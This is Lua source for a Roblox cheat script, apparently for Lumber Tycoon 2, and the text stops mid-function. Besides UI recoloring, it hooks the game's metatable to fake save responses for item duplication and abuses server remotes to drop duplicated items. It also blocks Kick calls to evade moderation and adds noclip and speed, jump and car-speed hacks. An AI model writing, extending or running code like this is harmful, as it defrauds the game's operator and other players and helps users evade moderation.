functions.carInitiate=function()
    requirements.connections.carInitiate=requirements.LP.CharacterAdded:Connect(function()
    repeat wait()until requirements.LP.Character and requirements.LP.Character:FindFirstChild('Humanoid')
        functions.carFallBack();
    end)
end;

functions.carFallBack=function()
requirements.connections.carFallBack=requirements.LP.Character.Humanoid:GetPropertyChangedSignal('SeatPart'):Connect(function()
    functions.modifyCar();
    end);
end;

functions.modifyCar=function()
    pcall(function()
        if requirements.ConfigSetup.carVisualEffects then
            local car=requirements.LP.Character.Humanoid.SeatPart.Parent;
            for _,v in next,car.PaintParts:GetDescendants()do 
                if v:IsA('BasePart')then 
                    v.Material=Enum.Material[requirements.ConfigSetup.carMaterial];
                    v.BrickColor=BrickColor.new(Color3.fromRGB(requirements.ConfigSetup.carColorR,requirements.ConfigSetup.carColorG,requirements.ConfigSetup.carColorB));
                end;
            end;
        end;
    end);
end;

functions.getButton=function(Text)
    for _,ScrollingFrame in next,game:GetService("PlayerGui").Ancestor.MainBody:GetChildren()do 
        if ScrollingFrame:FindFirstChild(tostring(Text))then 
            return ScrollingFrame;
        end;
    end;
    return false
end;

functions.makeClock=function(mode)
    if game.CoreGui:FindFirstChild'Stats'then 
        game.CoreGui:FindFirstChild'Stats':remove();
    end;
    if mode=='Dark'then 
        color1=Color3.fromRGB(15,15,15);
        color2=Color3.fromRGB(255,255,255);
    elseif mode=='Light'then 
        color1=Color3.fromRGB(255,255,255);
        color2=Color3.fromRGB(0,0,0);
    end;
end;
if requirements.ConfigSetup.uiDarkMode then
    functions.makeClock('Dark')
else
    functions.makeClock('Light');
end;

functions.uiMode=function(mode)   
    local lp=requirements.LP
    local color1,color2
    function createCorner(parent)
        if not parent:FindFirstChild('UICorner')then
            local uic=Instance.new('UICorner',parent);
            uic.CornerRadius=UDim.new(0,5)
        end;
    end;

    if mode=='Light'then 
        color1=Color3.fromRGB(255,255,255);
        color2=Color3.fromRGB(0,0,0);
        color3=Color3.fromRGB(220, 220, 220)
    elseif mode=='Dark'then 
        color1=Color3.fromRGB(15,15,15)
        color2=Color3.fromRGB(255,255,255);
        color3=Color3.fromRGB(15,15,15)
    end;
    --Open Menu Button
    local openMenu=lp.PlayerGui.MenuGUI.Open
    
    createCorner(openMenu)
    openMenu.BackgroundColor3=color1
    openMenu.TextLabel.TextColor3=color2
    createCorner(openMenu.DropShadow)
    
    --Main Menu 
    local mainMenu=lp.PlayerGui.MenuGUI.Menu.Main
    local mainMenuQuit=mainMenu.Parent.Quit
    
    mainMenu.BackgroundColor3=color1
    for i,v in next,mainMenu:GetDescendants()do 
        if v:IsA('TextLabel')then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2;
                v.BackgroundColor3=color1;
                createCorner(v)
                v.TextColor3=color2;
            elseif v.Name=='DropShadow'then
                createCorner(v)
                v.TextColor3=color1;
            end;
        end;
        if v:IsA('TextButton')then 
            createCorner(v)
            v.BackgroundColor3=color1;
        end;
    end;
    
    createCorner(mainMenuQuit);
    mainMenuQuit.BackgroundColor3=color1;
    mainMenuQuit.TextLabel.TextColor3=color2;
    createCorner(mainMenuQuit.DropShadow);createCorner(mainMenu);createCorner(mainMenu.DropShadow);
    
    --Load Menu 
    local loadMenu=lp.PlayerGui.LoadSaveGUI;
    loadMenu.SlotList.Main.BackgroundColor3=color1;
    for _,textLabel in next, loadMenu.SlotList.Main:GetDescendants()do 
        if textLabel:IsA('TextLabel')then
            if textLabel.Name=='IsCurrentSlot'then 
                textLabel.TextStrokeColor3=color1;
            end;
            if textLabel.Name=='DropShadow'then 
                textLabel.TextColor3=color1;
            else
            createCorner(textLabel)
            textLabel.TextColor3=color2;
        end;
        elseif textLabel:IsA('TextButton')then 
            textLabel.BackgroundColor3=color1;
            createCorner(textLabel)
        end;
    end;
    lp.PlayerGui.PropertyPurchasingGUI.SelectPurchase.Cost.BackgroundColor3=color1
    --Quit
    createCorner(loadMenu.SlotList.Quit)
    loadMenu.SlotList.Quit.BackgroundColor3=color1;
    loadMenu.SlotList.Quit.TextLabel.TextColor3=color2;
    createCorner(loadMenu.SlotList.Quit.DropShadow);
    createCorner(loadMenu.SlotList.Main);createCorner(loadMenu.SlotList.Main.DropShadow)
    --Load Current Slot 
    local slotInfoMain=loadMenu.SlotInfo.Main 
    local progress=loadMenu.Progress
    for _,v in next,progress:GetDescendants()do 
        if v:IsA'Frame' then 
            createCorner(v);
            if v.Name~='DropShadow'then 
                v.BackgroundColor3=color1;
            end;
        end;
    end;
    createCorner(progress.Main.Text);progress.Main.Text.BackgroundColor3=color1;progress.Main.Text.TextColor3=color2
    
    createCorner(slotInfoMain);createCorner(slotInfoMain.DropShadow)
    for _,button in next,slotInfoMain:GetDescendants()do 
        if button:IsA('TextButton')or button:IsA('TextLabel')then 
            button.BackgroundColor3=color1
            button.TextColor3=color2
            createCorner(button);
        end;
    end;
    slotInfoMain.BackgroundColor3=color1
    
    --Load Quit 
    createCorner(slotInfoMain.Parent.Quit)
    slotInfoMain.Parent.Quit.BackgroundColor3=color1;
    slotInfoMain.Parent.Quit.TextLabel.TextColor3=color2;
    createCorner(slotInfoMain.Parent.Quit.DropShadow);
    createCorner(slotInfoMain.Parent.Quit);createCorner(slotInfoMain.Parent.Quit.DropShadow)
    
    --Select Plot
    local selectPlot=lp.PlayerGui.PropertyPurchasingGUI
    for _, v in next,selectPlot:GetDescendants()do 
        if v.ClassName=='Frame'then 
            createCorner(v);
            if v.Name=='DropShadow'then 
                v.BackgroundColor3=Color3.fromRGB(0,0,0)
            else
                v.BackgroundColor3=color1
            end;
        end;
        if v:IsA('TextLabel')or v:IsA'TextButton'then 
            v.TextColor3=color2
            v.BackgroundColor3=color1
            createCorner(v);
        end;
    end;
    --Notice
    local noticeUI=lp.PlayerGui.NoticeGUI.Notice.Main 
    createCorner(noticeUI)
    noticeUI.BackgroundColor3=color1
    for _,v in next,noticeUI:GetDescendants()do 
        if v:IsA('TextButton')or v:IsA('TextLabel')then 
            v.TextColor3=color2
            v.BackgroundColor3=color1
            createCorner(v);
        end;
        if v:IsA('Frame')then 
            createCorner(v)
        end;
    end;
    
    --Money Gui 
    local buyMoney=lp.PlayerGui.BuyMoneyGUI.BuyMoney 
    
    for _,v in next,buyMoney:GetDescendants()do 
        if v:IsA('Frame')then 
            createCorner(v)
            if v.Name~='DropShadow'then 
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA('TextLabel')and not string.find(v.Text,'R')then 
            if v.Name~='DropShadow'then 
                v.TextColor3=color2;
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
        end;
        if v:IsA'TextButton'then 
            v.BackgroundColor3=color1;
        end;
        createCorner(v);
    end;
    
    --Whitelist 
    local whiteListGui=lp.PlayerGui.WhiteListGUI 
    
    for _,v in next,whiteListGui:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'or v:IsA'TextButton'then 
            if v.Name=='InfoT'then 
                v.TextStrokeColor3=color1;
            end;
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
                v.TextStrokeColor3=color2;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
        if v:IsA'ScrollingFrame'then 
            v.BackgroundColor3=color1;
        end;
    end;
    
    --Blacklist 
    local blackListGui=lp.PlayerGui.BlackListGUI 
    
    for _,v in next,blackListGui:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
        if v:IsA'ScrollingFrame'then 
            v.BackgroundColor3=color1;
        end;
    end;
    
    --Send Money 
    
    local sendMoney=lp.PlayerGui.DonateGUI 
    
    for _,v in next,sendMoney:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
        if v:IsA'ScrollingFrame'then 
            v.BackgroundColor3=color1;
        end;
    end;
    game:GetService('Players').LocalPlayer.PlayerGui.DonateGUI.Donate.Main.AmountLabel.BackgroundColor3=Color3.fromRGB(0,155,0);
    createCorner(game:GetService('Players').LocalPlayer.PlayerGui.DonateGUI.Donate.Main.AmountLabel)
    game:GetService('Players').LocalPlayer.PlayerGui.DonateGUI.Donate.Main.AmountLabel.TextColor3=color2
    --Changelog 
    local changeLog=lp.PlayerGui.ChangelogGUI
    
    for _,v in next,changeLog:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    
    --Credits
    local creditsUI=lp.PlayerGui.CreditsGUI
    
    for _,v in next,creditsUI:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    
    local scr=getsenv(requirements.LP.PlayerGui.CreditsGUI.CreditsClient)
        local old=scr.openWindow
        local old2=scr.displayPage
        scr.openWindow=function()
            old()
            local creditsUI=lp.PlayerGui.CreditsGUI
            for _,v in next,creditsUI:GetDescendants()do
                if v:IsA'Frame'then 
                    createCorner(v);
                    if v.Name~='DropShadow'then
                        v.BackgroundColor3=color1;
                    end;
                end;
                if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
                    if v.Name~='DropShadow'then
                        v.TextColor3=color2
                    else
                        v.TextColor3=color1;
                    end;
                    v.BackgroundColor3=color1;
                    createCorner(v);
                end;
            end;
        end;
        scr.displayPage=function()
        old2()
        local creditsUI=lp.PlayerGui.CreditsGUI
        for _,v in next,creditsUI:GetDescendants()do
            if v:IsA'Frame'then 
                createCorner(v);
                if v.Name~='DropShadow'then
                    v.BackgroundColor3=color1;
                end;
            end;
            if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
                if v.Name~='DropShadow'then
                    v.TextColor3=color2
                else
                    v.TextColor3=color1;
                end;
                v.BackgroundColor3=color1;
                createCorner(v);
            end;
        end;
    end;
    
    --OnBoarding 
    local onBoardingGUI=lp.PlayerGui.OnboardingGUI
    
    for _,v in next,onBoardingGUI:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    --Chat GUI
    local chat=lp.PlayerGui.ChatGUI
    for _,v in next,chat:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    --ItemDraggerGUI 
    local itemDraggingGUI=lp.PlayerGui.ItemDraggingGUI
    for _,v in next,itemDraggingGUI:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            v.TextColor3=color2
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    --ItemInfo 
    local itemInfoGUI=lp.PlayerGui.ItemInfoGUI
    for _,v in next,itemInfoGUI:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA('ImageLabel')then 
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
                v.TextStrokeColor3=color1
            else
                v.TextColor3=color1;
                v.TextStrokeColor3=color1
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    --InteractionGUI
    local interactionGUI=lp.PlayerGui.InteractionGUI
    for _,v in next,interactionGUI:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color2;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    game:GetService('Players').LocalPlayer.PlayerGui.InteractionGUI.OwnerShow.BackgroundColor3=color1;
    --StructureGui
    local structureDraggingGUI=lp.PlayerGui.StructureDraggingGUI
    for _,v in next,structureDraggingGUI:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    --WireDraggingGUI
    local wireDraggingGUI=lp.PlayerGui.WireDraggingGUI
    for _,v in next,wireDraggingGUI:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    --OverWriteConfirm
    local overWriteConfirm=loadMenu.OverwriteConfirm
    for _,v in next,overWriteConfirm:GetDescendants()do
        if v:IsA'Frame'then 
            createCorner(v);
            if v.Name~='DropShadow'then
                v.BackgroundColor3=color1;
            end;
        end;
        if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
            if v.Name~='DropShadow'then
                v.TextColor3=color2
            else
                v.TextColor3=color1;
            end;
            v.BackgroundColor3=color1;
            createCorner(v);
        end;
    end;
    game:GetService('Players').LocalPlayer.PlayerGui.ItemDraggingGUI.CanDrag.PlatformButton.KeyLabel.TextSize=14;
    game:GetService('Players').LocalPlayer.PlayerGui.ItemDraggingGUI.CanRotate.PlatformButton.KeyLabel.TextSize=14
    game:GetService('Players').LocalPlayer.PlayerGui.ItemDraggingGUI.CanRotate.PlatformButton.KeyLabel.TextScaled=false;
    for _,v in next,game:GetService('Players').LocalPlayer.PlayerGui:GetDescendants()do 
        if v.Name=='KeyLabel'then 
            v.TextColor3=Color3.fromRGB(0,0,0);
        end;
    end;
    --Blueprints
    local scr=getsenv(requirements.LP.PlayerGui.Blueprints.LocalBlueprints)
    local old=scr.populateCategoryList
    scr.populateCategoryList=function()
        old()
        local blueprints=lp.PlayerGui.Blueprints
        for _,v in next,blueprints:GetDescendants()do
            if v:IsA('ImageLabel')then 
                v.BackgroundColor3=color1;
            end;
            if v:IsA'Frame'then 
                createCorner(v);
                if v.Name~='DropShadow'then
                    v.BackgroundColor3=color1;
                elseif mode=='Dark'then 
                    v.BackgroundColor3=Color3.fromRGB(0,0,0);
                elseif mode=='Light'then 
                    v.BackgroundColor3=Color3.fromRGB(25,25,25);
                end;
            end;
            if v:IsA'TextLabel'and v.Name~='InfoT'or v:IsA'TextButton'then 
                if v.Name=='DropShadow'then
                    v:remove();
                end
                if v.Text=='Blueprints'and v.Name~='DropShadow'then 
                    v.TextColor3=color2;
                else
                    v.TextColor3=color2;
                end;
                v.BackgroundColor3=color1;
                createCorner(v);
            end;
            if v:IsA'ScrollingFrame'then 
                v.BackgroundColor3=color1;
            end;
        end;
    end;
end;
-- if requirements.ConfigSetup.uiDarkMode then 
-- 	functions.uiMode('Dark');
-- else
-- 	functions.uiMode('Light');
-- end;

functions.RemoveTool=function()
requirements.connections.antiWeld=game:GetService'RunService'.Stepped:Connect(function()
        for _,tool in next,requirements.LP.Character:children()do 
            if tool:IsA('Tool')and tostring(tool.Name)~='BlueprintTool'then 
                if not tool:FindFirstChild('Owner') or tool:FindFirstChild('Owner')then
                    if tostring(tool.Owner.Value)==tostring(requirements.LP)then return end;
                    if not functions.WhitelistCheck(tool.Owner.Value)then
                        requirements.LP.Character.Humanoid:UnequipTools();
                    end;
                end;
            end;
        end;
    end);
end;
functions.RemoveTool();

functions.selfDupeCurrentSlot=function(slot)
    if not slot then 
        slot=requirements.LP.CurrentSaveSlot.Value;
    end;
    local connection,newPlot;
    if requirements.Booleans.selfDuping then 
        functions.notify('Error', 'Already Duping!',4);
        return;
    end;
    if not requirements.Booleans.DisableSlotSaving then 
        functions.notify('Error','Disable slot saving is disabled!',4);
        return;
    end;
    local success=functions.PlotLogic();
    if success then 
        requirements.Booleans.selfDuping=true;
        functions.SaveSelectedSlot();
        functions.SelfWl(true);
        repeat wait()until requirements.LP.WhitelistFolder:FindFirstChild(tostring(requirements.LP))
        spawn(function()
            functions.LoadSelectedSlot(slot);
        end);
        local plot=functions.getPlayersBase(tostring(requirements.LP))
        originSquare=plot.OriginSquare;
        requirements.remotes.setPropertyPurchasingValue:InvokeServer(true);
        requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 40, originSquare.Position.Y, originSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 40, originSquare.Position.Y, originSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X, originSquare.Position.Y, originSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X, originSquare.Position.Y, originSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 40, originSquare.Position.Y, originSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 40, originSquare.Position.Y, originSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 40, originSquare.Position.Y, originSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 40, originSquare.Position.Y, originSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 80, originSquare.Position.Y, originSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 80, originSquare.Position.Y, originSquare.Position.Z));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X, originSquare.Position.Y, originSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X, originSquare.Position.Y, originSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 80, originSquare.Position.Y, originSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 80, originSquare.Position.Y, originSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 80, originSquare.Position.Y, originSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 80, originSquare.Position.Y, originSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 40, originSquare.Position.Y, originSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 40, originSquare.Position.Y, originSquare.Position.Z + 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 80, originSquare.Position.Y, originSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 80, originSquare.Position.Y, originSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 80, originSquare.Position.Y, originSquare.Position.Z + 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 80, originSquare.Position.Y, originSquare.Position.Z - 40));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X + 40, originSquare.Position.Y, originSquare.Position.Z - 80));requirements.remotes.clientExpandedProperty:FireServer(plot ,CFrame.new(originSquare.Position.X - 40, originSquare.Position.Y, originSquare.Position.Z - 80));
        functions.DeleteSurroundingTrees();
        requirements.remotes.setPropertyPurchasingValue:InvokeServer(false);
        plot.Owner.Value=nil;
        repeat wait()until requirements.LP.CurrentlySavingOrLoading.Value==false;
        local newPlot;
        repeat wait()newPlot=functions.getPlayersBase(tostring(requirements.LP));until newPlot;
        newPlot=newPlot.OriginSquare;
        functions.notify('ebays script','Basedropping Duped Items',4)
        for _,item in next,workspace.PlayerModels:children()do 
            if item:IsA('Model')and item:FindFirstChild('Owner')and tostring(item.Owner.Value)==tostring(requirements.LP)then 
                if item:FindFirstChild('Main')then 
                    if (item.Main.CFrame.p-newPlot.CFrame.p).Magnitude>100 then 
                        ItemName=item:FindFirstChild('PurchasedBoxItemName')or item:FindFirstChild('ToolName')or item:FindFirstChild('BoxItemName')or item:FindFirstChild('ItemName')
                        if ItemName then
                            game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(nil, CFrame.new(newPlot.CFrame.p+Vector3.new(4,1,4)),requirements.LP, nil, item, true)
                            game:GetService('RunService').Heartbeat:wait();
                        end;
                    end;
                end;
            end;    
        end;
        requirements.Booleans.selfDuping=false;
        functions.SelfWl(false);
        requirements.Booleans.DisableSlotSaving=false
        functions.SaveSelectedSlot();
        requirements.Booleans.DisableSlotSaving=true;
    end;
end;
--//End Of Functions\\--

--//Connections\\--
requirements.connections.noclip=requirements.services.RunService.Stepped:Connect(function()
    if requirements.Booleans.Noclip then 
        if not requirements.ConfigSetup.oldNoclipEnabled then 
            pcall(function()
                for i, v in next,requirements.LP.Character:children()do
                    if v:IsA('BasePart')then
                        v.CanCollide=false;
                    end;
                end;
            end);
        elseif requirements.ConfigSetup.oldNoclipEnabled then
            pcall(function()
                requirements.LP.Character:FindFirstChild('Humanoid'):ChangeState(11);
            end);
        end;
    end;
end);

requirements.connections.shiftConnectBegan=game:GetService('UserInputService').InputBegan:Connect(function(key,processed)
    if key.KeyCode==Enum.KeyCode.LeftShift and not processed then
        requirements.Booleans.isDragging=true;
    end;
end);

requirements.connections.shiftConnectEnded=game:GetService('UserInputService').InputEnded:Connect(function(key,processed)
    if key.KeyCode==Enum.KeyCode.LeftShift and not processed then
        requirements.Booleans.isDragging=false; 
    end;
end);

loadstring([[
    local args={...};
    local requirements = args[1]
    local sprint=false
    requirements.connections.main=requirements.services.RunService.Heartbeat:Connect(function()
    pcall(function()
        if requirements.LP.Character and requirements.LP.Character:FindFirstChild('Humanoid')then
            if not requirements.Booleans.dragExists then
                requirements.LP.Character.Humanoid.WalkSpeed=requirements.Strings.WalkSpeed;
            elseif requirements.Booleans.dragExists and requirements.Booleans.isDragging then
                requirements.LP.Character.Humanoid.WalkSpeed=0;
            end
            if requirements.Booleans.Sprinting and not sprint then
                requirements.Strings.WalkSpeed=requirements.Strings.WalkSpeed+requirements.Strings.SprintSpeed;
                sprint=true;
            end;
            if not requirements.Booleans.Sprinting and sprint then
                sprint=false;
            end;
            requirements.LP.Character.Humanoid.JumpPower=requirements.Strings.JumpPower;
            requirements.LP.Character.Humanoid.HipHeight=requirements.Strings.HipHeight;
            if requirements.ConfigSetup.AlwaysDay then
                requirements.services.Lighting.TimeOfDay=('12:00:00');
            elseif requirements.ConfigSetup.AlwaysNight then 
                requirements.services.Lighting.TimeOfDay=('2:00:00');
            end;
            if requirements.ConfigSetup.NoFog then 
                requirements.services.Lighting.FogEnd=1000000;
            end;
            if requirements.ConfigSetup.SpookEnabled then
                requirements.services.Lighting.Spook.Value=true;
            end;
            if not requirements.ConfigSetup.SpookEnabled then 
                requirements.services.Lighting.Spook.Value=false;
            end;
            if requirements.LP.Character.Humanoid.SeatPart then
                requirements.LP.Character.Humanoid.SeatPart.Parent.Configuration.MaxSpeed.Value=requirements.Strings.carSpeed;
            end;
        end;
    end);
end)]])(requirements);

--//End Of Connections\\--



---Autoloading scripts-----
local player = game.Players.LocalPlayer
function SaveReturn(...)
	return true, "noob lt2"
end

local mt = getrawmetatable(game)
local backup = mt.__namecall
if setreadonly then
	setreadonly(mt, false)
else
	make_writeable(mt, true)
end
mt.__namecall = newcclosure(function(...)
	local method = getnamecallmethod()
	local args = {
		...
	}
	if (method == "InvokeServer") and tostring(args[1]) == "RequestSave" then
		if DupeMode then
			return SaveReturn(...)
		else
			backup(...)
		end
	end
	return backup(...)
end)

local itemslist = {"CanOfCranberry","BagOfCandy","BagOfCandy2","Candy","CandyCane","Scoobis","Spork","CoalLump","Snowball","Plate","Cocoa","Duck","Cone","Toboggan","B1","PumpkinDark","PumpkinGreen","PumpkinCursed","PumpkinGhastly","PumpkinLumbkin","PropertySoldSign","Turkey","Turkey2","Turkey3","Turkey4","Turkey5","Eye1","GreenBall","BlueBall","RedBall","PlumBall","Bobblehead","Bobblehead2","Bobblehead3","Bobblehead4","Bobblehead5","Bobblehead6","Bobblehead7","WorkLight","BagOfSand","CanOfWorms","LightBulb","Dynamite","BurgerCola","Bowl","BlackBall","TealBall","FloorLamp1","WallLight1","WallLight2","Seat_Armchair","Seat_Couch","Seat_Loveseat","Bed1","Bed2","Refridgerator","Stove","Dishwasher","Toilet","Lamp1","BasicHatchet" ,"Axe1","Axe2","Axe3","SilverAxe","AxeAlphaTesters","Rukiryaxe","AxeBetaTesters","FireAxe","EndTimesAxe","AxeChicken","CandyCaneAxe","Beesaxe","AxeAmber","GingerbreadAxe","ManyAxe","AxeTwitter","RustyAxe","CaveAxe","CandyCornAxe" , "Painting1", "Painting2", "Painting3","Painting4","Painting5","Painting6","Painting7","Painting8","Painting9","Painting10", "Wire","NeonWireRed ", "NeonWireOrange","NeonWireYellow","NeonWireGreen","NeonWireCyan","NeonWireBlue","NeonWireViolet","NeonWireWhite","NeonWirePinky"}

----------------//funtion//-------------------
loadstring([[
function Stacker()
function MakePart(Pos, Size)
    local Part = Instance.new("Part", workspace)
    Part.Anchored = true
    Part.Size = Size
    Part.Position = Pos + game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    Part.Color = Color3.fromRGB(Pos.X, Pos.Y, Pos.Z)
    Part.CanCollide = false
end

local Player = game.Players.LocalPlayer
local XSort, ZSort = lengh, height

function SortItems(ItemName)
    local AllItems = {}
    for i,v in pairs(workspace.PlayerModels:GetChildren()) do
        if v:FindFirstChild("Owner") and v:FindFirstChild("PurchasedBoxItemName") then
            if v.Owner.Value == Player and v.PurchasedBoxItemName.Value == ItemName then
                table.insert(AllItems, v)
            end
        end
    end
    
    local PartSize = AllItems[1].Main.Size
    local Numbers = 0
    local Me = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(0,3.5,0)
    
    wait(3)
    
    for Y = 1, math.ceil(#AllItems / (XSort * ZSort)) do
        for X = 1, XSort do
            for Z = 1, ZSort do
                if Numbers < #AllItems then
                    Numbers = Numbers + 1
                    Args = {nil, CFrame.new(X * PartSize.X, Y * PartSize.Y, Z * PartSize.Z) + Me, Player, nil, AllItems[Numbers], true}
                    game:GetService("ReplicatedStorage").PlaceStructure.ClientPlacedStructure:FireServer(unpack(Args))
                else
                    print('fix k thx')
                    break
                end
            end
        end
    end
end
SortItems(stackitem)
end
]])();

----------------//stuff//---------------------
loadstring([[
    local mt = getrawmetatable(game);
    local old = mt.__namecall;
    local protect = newcclosure or protect_function
    setreadonly(mt, false);
    mt.__namecall = protect(function(self, ...)
        local method = getnamecallmethod();
        local argss = {...};
        if method == "Kick" then
            wait(9e9);
            return;
        end;
        return old(self, unpack(argss));
    end);
    hookfunction(game.Players.LocalPlayer.Kick,protect(function() wait(9e9) end));    
]])();
----------------//stuff//---------------------
loadstring([[
function Walkspeed(new)
    _G.WS = new;
	local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
	Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
		Humanoid.WalkSpeed = _G.WS;
	end)
	Humanoid.WalkSpeed = _G.WS;
end
]])();
----------------//stuff//---------------------
loadstring([[
function Jumppower(new)
	_G.JP = new;
	local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
	Humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
		Humanoid.JumpPower = _G.JP
	end)
